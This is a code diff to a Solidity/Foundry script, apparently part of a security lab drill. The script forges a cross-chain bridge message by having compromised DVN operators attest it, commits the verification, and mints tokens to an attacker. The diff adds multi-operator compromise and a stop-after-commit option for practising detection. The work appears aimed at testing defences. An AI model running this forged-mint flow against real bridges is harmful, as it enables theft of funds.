@@ -15,6 +15,8 @@ import {LabDVN} from "../src/lab/LabDVN.sol";
 ///   3. lzReceive -> OFT mints to the attacker      (permissionless)
 /// Stops after step 1 if the receive config needs more DVNs than the attacker controls.
 /// env: PRIVATE_KEY (the compromised DVN operator), ASSET, AMOUNT (whole tokens), ATTACKER, FORCE (optional)
+///   DVN_IDS + DVN_KEYS (optional, comma-separated, e.g. LabDVN_B,LabDVN_C): several compromised operators (ADR 0008 drill)
+///   STOP_AFTER_COMMIT (optional): stop after step 2, to drill detection + nilify before anyone executes
 contract ForgeMint is LabBase {
     function run() external {
         string memory asset = vm.envString("ASSET");
@@ -34,10 +36,22 @@ contract ForgeMint is LabBase {
         bytes32 payloadHash = keccak256(abi.encodePacked(guid, message));
         console.log("forging", asset, "nonce", nonce);
 
-        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        LabDVN(existing("LabDVN")).verify(address(receiveLib), header, payloadHash, 1);
-        console.log("1. compromised LabDVN attested the forged packet");
-
+        string[] memory ids = vm.envOr("DVN_IDS", ",", new string[](0));
+        uint256[] memory keys = vm.envOr("DVN_KEYS", ",", new uint256[](0));
+        if (ids.length == 0) {
+            ids = new string[](1);
+            ids[0] = "LabDVN";
+            keys = new uint256[](1);
+            keys[0] = vm.envUint("PRIVATE_KEY");
+        }
+        require(ids.length == keys.length, "DVN_IDS and DVN_KEYS differ in length");
+        for (uint256 i = 0; i < ids.length; i++) {
+            vm.startBroadcast(keys[i]);
+            LabDVN(existing(ids[i])).verify(address(receiveLib), header, payloadHash, 1);
+            vm.stopBroadcast();
+            console.log("1. compromised DVN attested the forged packet:", ids[i]);
+        }
+        vm.startBroadcast(keys[0]);
         UlnConfig memory cfg = receiveLib.getUlnConfig(receiver, srcEid);
         // FORCE=1 skips the check so the commit itself shows why it fails (use without --broadcast)
         if (!vm.envOr("FORCE", false) && !receiveLib.verifiable(cfg, keccak256(header), payloadHash)) {
@@ -46,7 +60,13 @@ contract ForgeMint is LabBase {
             return;
         }
         receiveLib.commitVerification(header, payloadHash);
-        console.log("2. committed: one DVN was enough for this OApp");
+        console.log("2. committed: the compromised DVNs were enough for this OApp");
+        if (vm.envOr("STOP_AFTER_COMMIT", false)) {
+            console.log("   stopped before lzReceive; payloadHash:");
+            console.logBytes32(payloadHash);
+            vm.stopBroadcast();
+            return;
+        }
         endpoint.lzReceive(Origin(srcEid, sender, nonce), receiver, guid, message, "");
         console.log("3. delivered: forged tokens minted to the attacker");
         vm.stopBroadcast();
